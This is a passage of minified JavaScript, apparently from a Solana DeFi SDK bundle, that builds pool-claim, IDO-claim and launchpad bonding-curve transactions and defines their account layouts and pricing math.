              associatedOnly:
                !u.mintAddress.equals(GI.WSOL.mint) && e.associatedOnly,
            });
          n && r.addInstruction(n), i.push(t);
        }
        r.addInstruction({
          instructions: [
            Lx.makeClaimInstruction({
              programId: t.programId,
              poolInfo: t,
              ownerInfo: {
                wallet: o,
                ownerPda: t.ownerAccountId,
                claimAddress: i,
              },
            }),
          ],
        });
        let { transaction: s, signers: a } = r.build();
        return [{ transaction: s, signer: a }];
      }
      async makeClaimAllTransaction({
        poolInfos: t,
        ownerInfo: e,
        feePayer: n,
      }) {
        let r = this.createTxBuilder(n),
          o = e.wallet || this.scope.ownerPubKey,
          i = {};
        for (let c of t) {
          let t = [];
          for (let n of c.tokenInfo) {
            let { account: s, instructionParams: a } =
              await this.scope.account.getOrCreateTokenAccount({
                mint: n.mintAddress,
                owner: this.scope.ownerPubKey,
                notUseTokenAccount: n.mintAddress.equals(GI.WSOL.mint),
                createInfo: { payer: o, amount: 0 },
                skipCloseAccount: !n.mintAddress.equals(GI.WSOL.mint),
                associatedOnly:
                  !n.mintAddress.equals(GI.WSOL.mint) && e.associatedOnly,
              });
            a && r.addInstruction(a),
              s && ((i[n.mintAddress.toString()] = s), t.push(s));
          }
          r.addInstruction({
            instructions: [
              Lx.makeClaimInstruction({
                programId: c.programId,
                poolInfo: c,
                ownerInfo: {
                  wallet: o,
                  ownerPda: c.ownerAccountId,
                  claimAddress: t,
                },
              }),
            ],
          });
        }
        let { transaction: s, signers: a } = r.build(),
          u = r.allInstructions;
        return a_(u, [o, ...a.map((t) => t.publicKey)])
          ? [{ transaction: s, signer: a }]
          : [
              {
                transaction: new bs().add(
                  ...u.slice(0, r.AllTxData.instructions.length - 1)
                ),
                signer: a,
              },
              {
                transaction: new bs().add(
                  ...u.slice(r.AllTxData.instructions.length - 1)
                ),
                signer: [],
              },
              {
                transaction: new bs().add(...r.AllTxData.endInstructions),
                signer: [],
              },
            ];
      }
      static makeClaimInstruction({ programId: t, poolInfo: e, ownerInfo: n }) {
        let r = VT([]),
          o = [
            { pubkey: n.wallet, isSigner: !0, isWritable: !0 },
            { pubkey: e.poolId, isSigner: !1, isWritable: !0 },
            { pubkey: n.ownerPda, isSigner: !1, isWritable: !0 },
            ...n.claimAddress.map((t) => ({
              pubkey: t,
              isSigner: !1,
              isWritable: !0,
            })),
            ...e.tokenInfo.map(({ mintVault: t }) => ({
              pubkey: t,
              isSigner: !1,
              isWritable: !0,
            })),
            { pubkey: _c, isSigner: !1, isWritable: !1 },
          ],
          i = ct.alloc(r.span);
        r.encode({}, i);
        let s = ct.from([10, 66, 208, 184, 161, 6, 191, 98, ...i]);
        return new ws({ keys: o, programId: t, data: s });
      }
    },
    Nx = Lx;
  (Nx.CLAIMED_NUM = 3),
    (Nx.POOL_LAYOUT = VT([
      ET(8),
      MT("bump"),
      MT("status"),
      NT("openTime"),
      NT("endTime"),
      WT("ammId"),
      HT(
        VT([
          MT("mintDecimals"),
          WT("mintAddress"),
          WT("mintVault"),
          NT("perLpLoss"),
          NT("totalClaimedAmount"),
        ]),
        Lx.CLAIMED_NUM,
        "tokenInfo"
      ),
      HT(NT(), 10, "padding"),
    ])),
    (Nx.OWNER_LAYOUT = VT([
      ET(8),
      MT("bump"),
      MT("version"),
      WT("poolId"),
      WT("owner"),
      NT("lpAmount"),
      HT(
        VT([WT("mintAddress"), NT("debtAmount"), NT("claimedAmount")]),
        Lx.CLAIMED_NUM,
        "tokenInfo"
      ),
      HT(NT(), 4, "padding"),
    ])),
    (Nx.DEFAULT_POOL_ID = [
      "58oQChx4yWmvKdwLLZzBi4ChoCc2fqCUWBkwMihLYQo2",
      "6UmmUiYoBjSrhakAobJw8BvkmJtDVxaeBtbt7rxWo1mg",
      "AVs9TA4nWDzfPJE9gGVNJMVhcQy3V9PGazuz33BfG2RA",
      "DVa7Qmb5ct9RCpaU7UTpSaf3GVMYz17vNVU67XpdCRut",
      "7XawhbbxtsRcQA8KTkHT9f9nc6d69UwqCDh6U5EEbEmX",
      "6a1CsrpeZubDjEJE9s1CMVheB6HWM5d7m1cj2jkhyXhj",
      "EoNrn8iUhwgJySD1pHu8Qxm5gSQqLK3za4m8xzD2RuEb",
      "AceAyRTWt4PyB2pHqf2qhDgNZDtKVNaxgL8Ru3V4aN1P",
      "6tmFJbMk5yVHFcFy7X2K8RwHjKLr6KVFLYXpgpBNeAxB",
    ].map((t) => new Xi(t))),
    (Nx.SEED_CONFIG = {
      pool: { id: ct.from("pool_seed", "utf8") },
      owner: { id: ct.from("user_claim_seed", "utf8") },
    }),
    (Nx.VERSION_PROJECT = [void 0, "Francium", "Tulip", "Larix"]),
    VT([MT("instruction"), TT("amount")]);
  var Dx = VT([MT("instruction")]);
  function Ux({ programId: t }, e) {
    let n = [
        { pubkey: _c, isSigner: !1, isWritable: !1 },
        { pubkey: UI, isSigner: !1, isWritable: !1 },
        ...Object.entries(e).map(([t, e]) => ({
          pubkey: e,
          isSigner: "userOwner" === t,
          isWritable: !["authority", "userOwner"].includes(t),
        })),
      ],
      r = ct.alloc(Dx.span);
    return (
      Dx.encode({ instruction: 2 }, r),
      new ws({ keys: n, programId: t, data: r })
    );
  }
  function qx(t) {
    let { poolConfig: e, userKeys: n, side: r } = t,
      o = "base" === r ? n.baseTokenAccount : n.quoteTokenAccount,
      i = "base" === r ? e.baseVault : e.quoteVault,
      s = ct.alloc(Dx.span);
    Dx.encode({ instruction: 2 }, s);
    let a = [
      { pubkey: _c, isWritable: !1, isSigner: !1 },
      { pubkey: ks, isWritable: !1, isSigner: !1 },
      { pubkey: e.id, isWritable: !0, isSigner: !1 },
      { pubkey: e.authority, isWritable: !1, isSigner: !1 },
      { pubkey: i, isWritable: !0, isSigner: !1 },
      { pubkey: o, isWritable: !0, isSigner: !1 },
      { pubkey: n.ledgerAccount, isWritable: !0, isSigner: !1 },
      { pubkey: n.owner, isWritable: !1, isSigner: !0 },
    ];
    return new ws({ programId: e.programId, keys: a, data: s });
  }
  var Wx = {
      [L_.IDO_PROGRAM_ID_V1.toString()]: 1,
      [L_.IDO_PROGRAM_ID_V2.toString()]: 2,
      [L_.IDO_PROGRAM_ID_V3.toString()]: 3,
      [L_.IDO_PROGRAM_ID_V4.toString()]: 4,
    },
    zx = class extends iT {
      async claim({
        ownerInfo: t,
        idoKeys: e,
        associatedOnly: n = !0,
        checkCreateATAOwner: r = !1,
        txVersion: o,
        feePayer: i,
      }) {
        let s = this.createTxBuilder(i),
          a = Wx[e.programId];
        a || this.logAndCreateError("invalid version", a);
        let u = YI(e),
          [c, l] = [!new Zn(t.coin).isZero(), !new Zn(t.pc).isZero()],
          d = u.projectInfo.mint.address.equals(zI),
          { account: f, instructionParams: h } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: u.projectInfo.mint.programId,
              mint: u.projectInfo.mint.address,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !d,
              notUseTokenAccount: d,
              associatedOnly: !d && n,
              checkCreateATAOwner: r,
            });
        !f &&
          c &&
          this.logAndCreateError(
            "target token accounts not found",
            "mint",
            e.projectInfo.mint.address
          ),
          c && h && s.addInstruction(h);
        let p = u.buyInfo.mint.address.equals(zI),
          { account: m, instructionParams: g } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: u.buyInfo.mint.programId,
              mint: u.buyInfo.mint.address,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !p,
              notUseTokenAccount: p,
              associatedOnly: !p && n,
              checkCreateATAOwner: r,
            });
        if (
          (!f &&
            l &&
            this.logAndCreateError(
              "target token accounts not found",
              "mint",
              e.projectInfo.mint.address
            ),
          l && g && s.addInstruction(g),
          (!f || !m) &&
            this.logAndCreateError(
              "target token accounts not found",
              "mint",
              e.projectInfo.mint.address,
              e.buyInfo.mint.address
            ),
          3 === a)
        )
          return s
            .addInstruction({
              instructions: [
                ...(c
                  ? [
                      Ux(
                        { programId: u.programId },
                        {
                          idoId: u.id,
                          authority: u.authority,
                          poolTokenAccount: u.projectInfo.vault,
                          userTokenAccount: f,
                          userIdoInfo: new Xi(t.userIdoInfo),
                          userOwner: this.scope.ownerPubKey,
                        }
                      ),
                    ]
                  : []),
                ...(l
                  ? [
                      Ux(
                        { programId: new Xi(e.programId) },
                        {
                          idoId: u.id,
                          authority: u.authority,
                          poolTokenAccount: u.buyInfo.vault,
                          userTokenAccount: m,
                          userIdoInfo: new Xi(t.userIdoInfo),
                          userOwner: this.scope.ownerPubKey,
                        }
                      ),
                    ]
                  : []),
              ],
            })
            .versionBuild({ txVersion: o });
        if (a < 3)
          return (
            !c && !l && this.logAndCreateError("no claimable rewards"),
            s
              .addInstruction({
                instructions: [
                  Ux(
                    { programId: u.programId },
                    {
                      idoId: u.id,
                      authority: u.authority,
                      poolQuoteTokenAccount: u.buyInfo.vault,
                      poolBaseTokenAccount: u.projectInfo.vault,
                      userQuoteTokenAccount: m,
                      userBaseTokenAccount: f,
                      userIdoInfo: new Xi(t.userIdoInfo),
                      userOwner: this.scope.ownerPubKey,
                    }
                  ),
                ],
              })
              .versionBuild({ txVersion: o })
          );
        let y = {
          poolConfig: {
            id: u.id,
            programId: u.programId,
            authority: u.authority,
            baseVault: u.projectInfo.vault,
            quoteVault: u.buyInfo.vault,
            baseToken: e.projectInfo.mint,
            quoteToken: e.buyInfo.mint,
          },
          userKeys: {
            baseTokenAccount: f,
            quoteTokenAccount: m,
            ledgerAccount: new Xi(t.userIdoInfo),
            owner: this.scope.ownerPubKey,
          },
        };
        return s
          .addInstruction({
            instructions: [
              ...(c ? [qx(AA(vA({}, y), { side: "base" }))] : []),
              ...(l ? [qx(AA(vA({}, y), { side: "quote" }))] : []),
            ],
          })
          .versionBuild({ txVersion: o });
      }
    },
    Kx = ct.from("vault_auth_seed", "utf8"),
    Fx = ct.from("global_config", "utf8"),
    jx = ct.from("pool", "utf8"),
    Gx = ct.from("pool_vault", "utf8"),
    Vx = ct.from("pool_vesting", "utf8"),
    Hx = ct.from("platform_config", "utf8");
  function Xx(t) {
    return u_([Kx], t);
  }
  function Zx(t, e, n) {
    return u_([jx, e.toBuffer(), n.toBuffer()], t);
  }
  function Jx(t, e, n) {
    return u_([Gx, e.toBuffer(), n.toBuffer()], t);
  }
  function Yx(t) {
    let e = new ArrayBuffer(1);
    return new DataView(e).setUint8(0, t), new Uint8Array(e);
  }
  function Qx(t) {
    return u_([ct.from("__event_authority", "utf8")], t);
  }
  function $x(t, e) {
    return u_([Hx, e.toBuffer()], t);
  }
  function tP(t, e, n) {
    return u_([Vx, e.toBuffer(), n.toBuffer()], t);
  }
  var eP = {
    initialize: ct.from([175, 175, 109, 31, 13, 152, 155, 237]),
    buyExactIn: ct.from([250, 234, 13, 123, 213, 156, 19, 236]),
    buyExactOut: ct.from([24, 211, 116, 40, 105, 3, 153, 56]),
    sellExactIn: ct.from([149, 39, 222, 155, 211, 124, 152, 26]),
    sellExactOut: ct.from([95, 200, 71, 34, 8, 9, 11, 166]),
    createVestingAccount: ct.from([129, 178, 2, 13, 217, 172, 230, 218]),
    claimVestedToken: ct.from([49, 33, 104, 30, 189, 157, 79, 35]),
    createPlatformConfig: ct.from([176, 90, 196, 175, 253, 113, 220, 20]),
    claimPlatformFee: ct.from([156, 39, 208, 135, 76, 237, 61, 72]),
    updatePlaformConfig: ct.from([195, 60, 76, 129, 146, 45, 67, 143]),
  };
  function nP(
    t,
    e,
    n,
    r,
    o,
    i,
    s,
    a,
    u,
    c,
    l,
    d,
    f,
    h,
    p,
    m,
    g,
    y,
    w,
    b,
    v,
    A
  ) {
    let k = VT([MT("decimals"), jT("name"), jT("symbol"), jT("uri")]),
      I = VT([NT("totalLockedAmount"), NT("cliffPeriod"), NT("unlockPeriod")]),
      S = VT([
        MT("index"),
        NT("supply"),
        NT("totalFundRaisingB"),
        MT("migrateType"),
      ]),
      _ = VT([
        MT("index"),
        NT("supply"),
        NT("totalSellA"),
        NT("totalFundRaisingB"),
        MT("migrateType"),
      ]),
      T = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !1 },
        { pubkey: i, isSigner: !1, isWritable: !1 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !0, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !1 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !0 },
        { pubkey: d, isSigner: !1, isWritable: !0 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !1 },
        { pubkey: qI, isSigner: !1, isWritable: !1 },
        { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
        { pubkey: DI, isSigner: !1, isWritable: !1 },
        { pubkey: Qx(t).publicKey, isSigner: !1, isWritable: !1 },
        { pubkey: t, isSigner: !1, isWritable: !1 },
      ],
      C = ct.alloc(
        ct.from(m, "utf-8").length +
          ct.from(g, "utf-8").length +
          ct.from(y, "utf-8").length +
          12 +
          1
      ),
      B = ct.alloc(I.span),
      E = ct.alloc("ConstantCurve" === w.type ? _.span : S.span);
    return (
      k.encode({ decimals: p, name: m, symbol: g, uri: y }, C),
      "ConstantCurve" === w.type
        ? _.encode(
            AA(vA({ index: 0 }, w), {
              migrateType: "amm" === w.migrateType ? 0 : 1,
            }),
            E
          )
        : "FixedCurve" === w.type
        ? S.encode(
            AA(vA({ index: 1 }, w), {
              migrateType: "amm" === w.migrateType ? 0 : 1,
            }),
            E
          )
        : "LinearCurve" === w.type &&
          S.encode(
            AA(vA({ index: 2 }, w), {
              migrateType: "amm" === w.migrateType ? 0 : 1,
            }),
            E
          ),
      I.encode({ totalLockedAmount: b, cliffPeriod: v, unlockPeriod: A }, B),
      new ws({
        keys: T,
        programId: t,
        data: ct.from([...eP.initialize, ...C, ...E, ...B]),
      })
    );
  }
  function rP(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y) {
    let w = VT([NT("amountB"), NT("minAmountA"), NT("shareFeeRate")]),
      b = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !1 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !1 },
        { pubkey: Qx(t).publicKey, isSigner: !1, isWritable: !1 },
        { pubkey: t, isSigner: !1, isWritable: !1 },
      ];
    y && b.push({ pubkey: y, isSigner: !1, isWritable: !0 }), void 0;
    let v = ct.alloc(w.span);
    return (
      w.encode(
        { amountB: p, minAmountA: m, shareFeeRate: null != g ? g : new Zn(0) },
        v
      ),
      new ws({ keys: b, programId: t, data: ct.from([...eP.buyExactIn, ...v]) })
    );
  }
  function oP(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y) {
    let w = VT([NT("amountA"), NT("minAmountB"), NT("shareFeeRate")]),
      b = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !1 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !1 },
        { pubkey: Qx(t).publicKey, isSigner: !1, isWritable: !1 },
        { pubkey: t, isSigner: !1, isWritable: !1 },
      ];
    y && b.push({ pubkey: y, isSigner: !1, isWritable: !0 });
    let v = ct.alloc(w.span);
    return (
      w.encode(
        { amountA: p, minAmountB: m, shareFeeRate: null != g ? g : new Zn(0) },
        v
      ),
      new ws({
        keys: b,
        programId: t,
        data: ct.from([...eP.sellExactIn, ...v]),
      })
    );
  }
  function iP(t, e, n, r, o, i, s, a, u) {
    let c = VT([]),
      l = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !1 },
        { pubkey: u, isSigner: !1, isWritable: !1 },
        { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
        { pubkey: Cc, isSigner: !1, isWritable: !1 },
      ],
      d = ct.alloc(c.span);
    return (
      c.encode({}, d),
      new ws({
        keys: l,
        programId: t,
        data: ct.from([...eP.claimVestedToken, ...d]),
      })
    );
  }
  function sP(t, e, n, r, o, i) {
    let s = VT([NT("shareAmount")]),
      a = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !0 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
      ],
      u = ct.alloc(s.span);
    return (
      s.encode({ shareAmount: i }, u),
      new ws({
        keys: a,
        programId: t,
        data: ct.from([...eP.createVestingAccount, ...u]),
      })
    );
  }
  function aP(t, e, n, r, o, i, s, a, u) {
    let c = [
      { pubkey: e, isSigner: !0, isWritable: !0 },
      { pubkey: n, isSigner: !1, isWritable: !1 },
      { pubkey: r, isSigner: !1, isWritable: !0 },
      { pubkey: o, isSigner: !1, isWritable: !0 },
      { pubkey: i, isSigner: !1, isWritable: !0 },
      { pubkey: s, isSigner: !1, isWritable: !0 },
      { pubkey: a, isSigner: !1, isWritable: !0 },
      { pubkey: u, isSigner: !1, isWritable: !0 },
      { pubkey: Fs.programId, isSigner: !1, isWritable: !0 },
      { pubkey: Cc, isSigner: !1, isWritable: !0 },
    ];
    return new ws({ keys: c, programId: t, data: eP.claimPlatformFee });
  }
  function uP(t, e, n, r, o, i, s, a, u, c, l) {
    let d = VT([
        NT("platformScale"),
        NT("creatorScale"),
        NT("burnScale"),
        NT("feeRate"),
        jT("name"),
        jT("web"),
        jT("img"),
      ]),
      f = [
        { pubkey: e, isSigner: !0, isWritable: !0 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
      ],
      h = ct.alloc(
        32 +
          ct.from(u, "utf-8").length +
          ct.from(c, "utf-8").length +
          ct.from(l, "utf-8").length +
          12
      );
    return (
      d.encode(
        {
          platformScale: s.platformScale,
          creatorScale: s.creatorScale,
          burnScale: s.burnScale,
          feeRate: a,
          name: u,
          web: c,
          img: l,
        },
        h
      ),
      new ws({
        keys: f,
        programId: t,
        data: ct.from([...eP.createPlatformConfig, ...h]),
      })
    );
  }
  function cP(t, e, n, r) {
    let o,
      i = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !0 },
      ];
    if ("updateClaimFeeWallet" === r.type) {
      let t = VT([MT("index"), WT("value")]);
      (o = ct.alloc(t.span)), t.encode({ index: 0, value: r.value }, o);
    } else if ("updateLockNftWallet" === r.type) {
      let t = VT([MT("index"), WT("value")]);
      (o = ct.alloc(t.span)), t.encode({ index: 1, value: r.value }, o);
    } else if ("migrateCpLockNftScale" === r.type) {
      let t = VT([
        MT("index"),
        NT("platformScale"),
        NT("creatorScale"),
        NT("burnScale"),
      ]);
      (o = ct.alloc(t.span)), t.encode(vA({ index: 2 }, r.value), o);
    } else if ("updateFeeRate" === r.type) {
      let t = VT([MT("index"), NT("value")]);
      (o = ct.alloc(t.span)), t.encode({ index: 3, value: r.value }, o);
    } else if (
      "updateImg" === r.type ||
      "updateName" === r.type ||
      "updateWeb" === r.type
    ) {
      let t = VT([MT("index"), jT("value")]);
      (o = ct.alloc(ct.from(r.value, "utf-8").length + 4 + 1)),
        "updateName" === r.type
          ? t.encode({ index: 4, value: r.value }, o)
          : "updateWeb" === r.type
          ? t.encode({ index: 5, value: r.value }, o)
          : "updateImg" === r.type && t.encode({ index: 6, value: r.value }, o);
    } else if ("updateCpConfigId" === r.type) {
      i.push({ pubkey: r.value, isSigner: !1, isWritable: !1 });
      let t = VT([MT("index")]);
      (o = ct.alloc(t.span)), t.encode({ index: 7 }, o);
    } else {
      if ("updateAll" !== r.type) throw Error("updateInfo params type error");
      {
        void 0,
          i.push({ pubkey: r.value.cpConfigId, isSigner: !1, isWritable: !1 });
        let t = VT([
          MT("index"),
          WT("platformClaimFeeWallet"),
          WT("platformLockNftWallet"),
          NT("platformScale"),
          NT("creatorScale"),
          NT("burnScale"),
          NT("feeRate"),
          jT("name"),
          jT("web"),
          jT("img"),
        ]);
        (o = ct.alloc(
          109 +
            ct.from(r.value.name, "utf-8").length +
            ct.from(r.value.web, "utf-8").length +
            ct.from(r.value.img, "utf-8").length
        )),
          t.encode(
            {
              index: 8,
              platformClaimFeeWallet: r.value.platformClaimFeeWallet,
              platformLockNftWallet: r.value.platformLockNftWallet,
              platformScale: r.value.migrateCpLockNftScale.platformScale,
              creatorScale: r.value.migrateCpLockNftScale.creatorScale,
              burnScale: r.value.migrateCpLockNftScale.burnScale,
              feeRate: r.value.feeRate,
              name: r.value.name,
              web: r.value.web,
              img: r.value.img,
            },
            o
          );
      }
    }
    return new ws({
      keys: i,
      programId: t,
      data: ct.from([...eP.updatePlaformConfig, ...o]),
    });
  }
  var lP = VT([
      NT(),
      NT("epoch"),
      MT("curveType"),
      ST("index"),
      NT("migrateFee"),
      NT("tradeFeeRate"),
      NT("maxShareFeeRate"),
      NT("minSupplyA"),
      NT("maxLockRate"),
      NT("minSellRateA"),
      NT("minMigrateRateA"),
      NT("minFundRaisingB"),
      WT("mintB"),
      WT("protocolFeeOwner"),
      WT("migrateFeeOwner"),
      WT("migrateToAmmWallet"),
      WT("migrateToCpmmWallet"),
      HT(NT(), 16),
    ]),
    dP = VT([
      NT("totalLockedAmount"),
      NT("cliffPeriod"),
      NT("unlockPeriod"),
      NT("startTime"),
      NT("totalAllocatedShare"),
    ]),
    fP = VT([
      NT(),
      NT("epoch"),
      MT("bump"),
      MT("status"),
      MT("mintDecimalsA"),
      MT("mintDecimalsB"),
      MT("migrateType"),
      NT("supply"),
      NT("totalSellA"),
      NT("virtualA"),
      NT("virtualB"),
      NT("realA"),
      NT("realB"),
      NT("totalFundRaisingB"),
      NT("protocolFee"),
      NT("platformFee"),
      NT("migrateFee"),
      dP.replicate("vestingSchedule"),
      WT("configId"),
      WT("platformId"),
      WT("mintA"),
      WT("mintB"),
      WT("vaultA"),
      WT("vaultB"),
      WT("creator"),
      HT(NT(), 8),
    ]);
  VT([
    NT(),
    NT("epoch"),
    WT("poolId"),
    WT("beneficiary"),
    NT("claimedAmount"),
    NT("tokenShareAmount"),
    HT(NT(), 8),
  ]);
  var hP = VT([
      NT(),
      NT("epoch"),
      WT("platformClaimFeeWallet"),
      WT("platformLockNftWallet"),
      NT("platformScale"),
      NT("creatorScale"),
      NT("burnScale"),
      NT("feeRate"),
      HT(MT(), 64, "name"),
      HT(MT(), 256, "web"),
      HT(MT(), 256, "img"),
      WT("cpConfigId"),
      HT(MT(), 224),
    ]),
    pP = class {
      static getPoolInitPriceByPool({ poolInfo: t, decimalA: e, decimalB: n }) {
        throw Error();
      }
      static getPoolInitPriceByInit({ a: t, b: e, decimalA: n, decimalB: r }) {
        throw Error();
      }
      static getPoolPrice({ poolInfo: t, decimalA: e, decimalB: n }) {
        throw Error();
      }
      static getPoolEndPrice({
        supply: t,
        totalSell: e,
        totalLockedAmount: n,
        totalFundRaising: r,
        migrateFee: o,
        decimalA: i,
        decimalB: s,
      }) {
        throw Error();
      }
      static getPoolEndPriceReal({ poolInfo: t, decimalA: e, decimalB: n }) {
        throw Error();
      }
      static getInitParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        migrateFee: o,
      }) {
        throw Error();
      }
      static buyExactIn({ poolInfo: t, amount: e }) {
        throw Error();
      }
      static buyExactOut({ poolInfo: t, amount: e }) {
        throw Error();
      }
      static sellExactIn({ poolInfo: t, amount: e }) {
        throw Error();
      }
      static sellExactOut({ poolInfo: t, amount: e }) {
        throw Error();
      }
    },
    mP = class extends pP {
      static getPoolInitPriceByPool({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new mI(t.virtualB.toString())
          .div(t.virtualA.toString())
          .mul(10 ** (e - n));
      }
      static getPoolInitPriceByInit({ a: t, b: e, decimalA: n, decimalB: r }) {
        return new mI(e.toString()).div(t.toString()).mul(10 ** (n - r));
      }
      static getPoolPrice({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new mI(t.virtualB.add(t.realB).toString())
          .div(t.virtualA.sub(t.realA).toString())
          .mul(10 ** (e - n));
      }
      static getPoolEndPrice({
        supply: t,
        totalSell: e,
        totalLockedAmount: n,
        totalFundRaising: r,
        migrateFee: o,
        decimalA: i,
        decimalB: s,
      }) {
        return new mI(r.sub(o).toString())
          .div(t.sub(e).sub(n).toString())
          .mul(10 ** (i - s));
      }
      static getPoolEndPriceReal({ poolInfo: t, decimalA: e, decimalB: n }) {
        let r = t.totalSellA.sub(t.realA),
          o = t.totalFundRaisingB.sub(t.realB);
        return new mI(t.virtualB.add(t.realB.add(o)).toString())
          .div(t.virtualA.sub(t.realA.add(r)).toString())
          .mul(10 ** (e - n));
      }
      static getInitParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        migrateFee: o,
      }) {
        if (t.lte(n)) throw Error("supply need gt total sell");
        let i = t.sub(n).sub(r);
        if (i.lte(new Zn(0))) throw Error("supplyMinusSellLocked <= 0");
        let s = e.sub(o);
        if (s.lte(new Zn(0))) throw Error("tfMinusMf <= 0");
        let a = s.mul(n).mul(n).div(i),
          u = s.mul(n).div(i).sub(e);
        if (u.lt(new Zn(0)))
          throw Error("supply/totalSell/totalLockedAmount diff too high");
        let c = a.div(u),
          l = e.mul(e).div(u);
        if (c.lt(new Zn(0)) || l.lt(new Zn(0))) throw Error("invalid input 0");
        return { a: c, b: l, c: n };
      }
      static buyExactIn({ poolInfo: t, amount: e }) {
        return this.getAmountOut({
          amountIn: e,
          inputReserve: t.virtualB.add(t.realB),
          outputReserve: t.virtualA.sub(t.realA),
        });
      }
      static buyExactOut({ poolInfo: t, amount: e }) {
        return this.getAmountIn({
          amountOut: e,
          inputReserve: t.virtualB.add(t.realB),
          outputReserve: t.virtualA.sub(t.realA),
        });
      }
      static sellExactIn({ poolInfo: t, amount: e }) {
        return this.getAmountOut({
          amountIn: e,
          inputReserve: t.virtualA.sub(t.realA),
          outputReserve: t.virtualB.add(t.realB),
        });
      }
      static sellExactOut({ poolInfo: t, amount: e }) {
        return this.getAmountIn({
          amountOut: e,
          inputReserve: t.virtualA.sub(t.realA),
          outputReserve: t.virtualB.add(t.realB),
        });
      }
      static getAmountOut({ amountIn: t, inputReserve: e, outputReserve: n }) {
        let r = t.mul(n),
          o = e.add(t);
        return r.div(o);
      }
      static getAmountIn({ amountOut: t, inputReserve: e, outputReserve: n }) {
        return W_(e.mul(t), n.sub(t));
      }
    },
    gP = class extends pP {
      static getPoolInitPriceByPool({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new mI(t.virtualB.toString())
          .div(t.virtualA.toString())
          .mul(10 ** (e - n));
      }
      static getPoolInitPriceByInit({ a: t, b: e, decimalA: n, decimalB: r }) {
        return new mI(e.toString()).div(t.toString()).mul(10 ** (n - r));
      }
      static getPoolPrice({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new mI(t.virtualB.toString())
          .div(t.virtualA.toString())
          .mul(10 ** (e - n));
      }
      static getPoolEndPrice({
        supply: t,
        totalSell: e,
        totalLockedAmount: n,
        totalFundRaising: r,
        migrateFee: o,
        decimalA: i,
        decimalB: s,
      }) {
        return new mI(r.sub(o).toString())
          .div(t.sub(e).sub(n).toString())
          .mul(10 ** (i - s));
      }
      static getPoolEndPriceReal({ poolInfo: t, decimalA: e, decimalB: n }) {
        let r = t.totalSellA.sub(t.realA),
          o = t.totalFundRaisingB.sub(t.realB);
        return new mI(t.virtualB.add(t.realB).add(o).toString())
          .div(t.virtualA.sub(t.realA).add(r).toString())
          .mul(10 ** (e - n));
      }
      static getInitParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        migrateFee: o,
      }) {
        let i = t.sub(r);
        if (i.lte(new Zn(0))) throw Error("invalid input 1");
        let s = new Zn(2).mul(e).sub(o),
          a = e.mul(i).div(s);
        return { a: a, b: e, c: a };
      }
      static buyExactIn({ poolInfo: t, amount: e }) {
        return this.getAmountOut({
          amountIn: e,
          initInput: t.virtualB,
